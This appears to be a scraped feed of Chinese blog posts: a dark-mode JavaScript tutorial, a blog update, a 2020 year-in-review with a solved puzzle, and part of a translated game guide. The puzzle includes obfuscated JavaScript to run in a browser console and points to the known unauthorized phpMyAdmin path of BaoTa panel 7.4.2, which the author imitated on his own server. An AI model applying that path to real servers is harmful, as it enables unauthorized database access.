class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 18:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster 